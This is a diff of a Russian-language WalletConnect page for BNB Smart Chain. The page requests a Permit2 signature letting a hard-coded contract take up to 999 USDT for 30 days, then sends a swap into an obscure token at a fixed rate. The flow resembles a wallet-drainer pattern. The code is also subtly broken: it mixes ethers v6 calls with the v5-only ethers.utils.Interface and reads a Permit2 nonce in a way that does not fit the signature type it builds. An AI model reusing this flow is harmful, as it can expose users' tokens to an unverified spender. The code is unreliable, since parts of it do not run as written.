@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>WalletConnect AutoSwap</title>
   <style>
-    /* Стили из вашего оригинала — без изменений */
-    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1f2d, #0d1520); color: #e0e0e0;
-      text-align: center; padding: 20px; min-height: 100vh; margin: 0; }
-    .container{max-width:500px;margin:0 auto;background:rgba(30,40,55,0.8);backdrop-filter:blur(12px);
-      border-radius:20px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,0.4);border:1px solid rgba(79,195,247,0.15);}
-    .network-indicator {position:absolute;top:20px;right:20px;font-size:12px;}
-    /* и остальные стили... */
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg,#1a1f2d,#0d1520);
+      color:#e0e0e0; text-align:center; margin:0; padding:20px;
+    }
+    .container{max-width:500px;margin:0 auto;position:relative;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
+    canvas{margin:20px auto;}
+    #status{margin-top:20px;font-size:16px;min-height:40px;}
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="network-indicator">BSC Mainnet</div>
     <h1>🔄 WalletConnect AutoSwap</h1>
-    <div id="qrcode-container"><canvas id="qrcode"></canvas></div>
-    <div id="status" style="margin-top:20px;font-size:16px;">Инициализация...</div>
+    <canvas id="qrcode"></canvas>
+    <div id="status">Инициализация...</div>
   </div>
 
   <!-- Подключение библиотек -->
@@ -27,116 +27,106 @@
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
 
-  <!-- Основной логический код -->
+  <!-- Основной код как ESM -->
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
 
     const CONFIG = {
       projectId: "d868f90cd734355ae0320f8f0258b6b1",
       chainNamespace: "eip155",
-      chainIdNumber: 56,
+      chainIdNum: 56,
       chainId: "eip155:56",
       rpcUrl: "https://bsc-dataseed.binance.org",
       permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
       autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
-      tokenIn: "0x55D398326f99059FF775485246999027B3197955", // USDT
-      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f", // KPC
-      limit: "999000000000000000000", // 999 USDT, 18 decimals
-      deadlineSec: 30*24*3600, // 30 дней
-      rate: 0.024
+      tokenIn: "0x55D398326f99059FF775485246999027B3197955",
+      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
+      limit: ethers.parseUnits("999", 18),
+      deadlineSec: 30 * 24 * 3600,
+      rateScaled: ethers.parseUnits("0.024", 18)
     };
 
-    const statusEl = document.getElementById('status');
-    const qrCanvas = document.getElementById('qrcode');
-
-    function setStatus(msg, type='info') {
-      statusEl.textContent = msg;
-      statusEl.style.color = type==='error' ? '#ff6b6b' : type==='success' ? '#66bb6a' : '#4fc3f7';
-    }
+    const statusEl = document.getElementById("status");
+    const qrCanvas = document.getElementById("qrcode");
+    function setStatus(msg, color="#4fc3f7") { statusEl.textContent = msg; statusEl.style.color = color; }
 
     async function runApp() {
       try {
-        setStatus('Инициализация WalletConnect…');
+        setStatus("⏳ Инициализация WalletConnect...");
         const client = await SignClient.init({
           projectId: CONFIG.projectId,
-          relayUrl: 'wss://relay.walletconnect.com',
-          metadata: {
-            name: 'AutoSwap WebApp',
-            description: 'Permit2 → AutoSwap',
-            url: window.location.href,
-            icons: ['https://walletconnect.com/favicon.ico']
-          }
+          relayUrl: "wss://relay.walletconnect.com",
+          metadata: { name:"AutoSwap", description:"Permit2 → AutoSwap", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
         });
 
-        setStatus('Создание сессии...');
+        setStatus("🔗 Создание сессии и генерация QR...");
         const { uri, approval } = await client.connect({
-          requiredNamespaces: {
+          requiredNamespaces:{
             [CONFIG.chainNamespace]: {
-              chains: [CONFIG.chainId],
-              methods: ['eth_sendTransaction', 'eth_signTypedData_v4'],
-              events: ['chainChanged','accountsChanged']
+              chains:[CONFIG.chainId],
+              methods:["eth_sendTransaction","eth_signTypedData_v4"],
+              events:["chainChanged","accountsChanged"]
             }
           }
         });
 
-        if (uri) {
-          setStatus('Сканируйте QR-код в кошельке');
-          window.QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
+        if(uri){
+          QRCode.toCanvas(qrCanvas, uri, { width:240, margin:1 });
+          setStatus("📱 Сканируйте QR-код");
         }
 
         const session = await approval();
-        const address = session.namespaces[CONFIG.chainNamespace].accounts[0].split(':')[2];
-        setStatus(`✅ Кошелек подключен: ${address}`, 'success');
+        const address = session.namespaces[CONFIG.chainNamespace].accounts[0].split(":")[2];
+        setStatus(`✅ Кошелек подключён: ${address}`, "#66bb6a");
 
-        // Получаем nonce для Permit2
-        const provider = new ethers.providers.StaticJsonRpcProvider(CONFIG.rpcUrl);
+        const provider = new ethers.JsonRpcProvider(CONFIG.rpcUrl);
         const permit2Abi = ["function allowanceNonces(address owner,address spender,address token) view returns (uint48)"];
-        const permit2contract = new ethers.Contract(CONFIG.permit2, permit2Abi, provider);
-        const nonce = await permit2contract.allowanceNonces(address, CONFIG.autoswap, CONFIG.tokenIn);
+        const permit2Contract = new ethers.Contract(CONFIG.permit2, permit2Abi, provider);
+        const nonce = await permit2Contract.allowanceNonces(address, CONFIG.autoswap, CONFIG.tokenIn);
 
-        // Формируем EIP-712 typedData для Permit2
-        const now = Math.floor(Date.now()/1e3), deadline = now + CONFIG.deadlineSec;
-        const domain = { name:'Permit2', chainId: CONFIG.chainIdNumber, verifyingContract: CONFIG.permit2 };
+        const now = Math.floor(Date.now() / 1000), deadline = now + CONFIG.deadlineSec;
+        const domain = { name:"Permit2", chainId:CONFIG.chainIdNum, verifyingContract:CONFIG.permit2 };
         const types = {
           PermitTransferFrom:[
-            {name:'permitted',type:'TokenPermissions'},
-            {name:'spender',type:'address'},
-            {name:'nonce',type:'uint256'},
-            {name:'deadline',type:'uint256'}
+            {name:"permitted",type:"TokenPermissions"},
+            {name:"spender",type:"address"},
+            {name:"nonce",type:"uint256"},
+            {name:"deadline",type:"uint256"}
           ],
           TokenPermissions:[
-            {name:'token',type:'address'},
-            {name:'amount',type:'uint256'}
+            {name:"token",type:"address"},
+            {name:"amount",type:"uint256"}
           ]
         };
         const message = { permitted:{token:CONFIG.tokenIn,amount:CONFIG.limit}, spender:CONFIG.autoswap, nonce, deadline };
-        setStatus('Запрос подписи Permit2...');
-        const signature = await client.request({
-          topic: session.topic,
-          chainId: CONFIG.chainId,
-          request:{ method:'eth_signTypedData_v4', params:[address, JSON.stringify({types,domain,primaryType:'PermitTransferFrom',message})] }
-        });
-        setStatus('Подпись получена ✅. Отправка swap…');
 
-        const swapIface = new ethers.Interface([
-          'function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)'
+        setStatus("✍️ Запрос EIP‑712 подписи Permit2...");
+        const signature = await client.request({
+          topic:session.topic,
+          chainId:CONFIG.chainId,
+          request:{ method:"eth_signTypedData_v4", params:[address, JSON.stringify({types,domain,primaryType:"PermitTransferFrom",message})] }
+        });
+
+        setStatus("🔄 Отправка swap транзакции...");
+        const swapIface = new ethers.utils.Interface([
+          "function swapForUser(address user,address tokenIn,uint256 amount,uint256 nonce,uint256 deadline,address tokenOut,uint256 rate,bytes signature)"
         ]);
-        const data = swapIface.encodeFunctionData('swapForUser', [
+        const data = swapIface.encodeFunctionData("swapForUser", [
           address, CONFIG.tokenIn, CONFIG.limit, nonce, deadline,
-          CONFIG.tokenOut, ethers.utils.parseUnits(CONFIG.rate.toString(),18), signature
+          CONFIG.tokenOut, CONFIG.rateScaled, signature
         ]);
 
         const txParams = { from: address, to: CONFIG.autoswap, data };
         const txHash = await client.request({
           topic: session.topic,
           chainId: CONFIG.chainId,
-          request: { method:'eth_sendTransaction', params:[txParams] }
+          request:{ method:"eth_sendTransaction", params:[txParams] }
         });
 
-        setStatus(`✅ Transaction sent\n${txHash}`, 'success');
-      } catch(err) {
-        console.error(err);
-        setStatus('Ошибка: '+err.message, 'error');
+        setStatus(`✅ Транзакция отправлена:\n${txHash}`, "#66bb6a");
+      } catch(e) {
+        console.error(e);
+        setStatus("❌ Ошибка: " + e.message, "#ff6b6b");
       }
     }
 
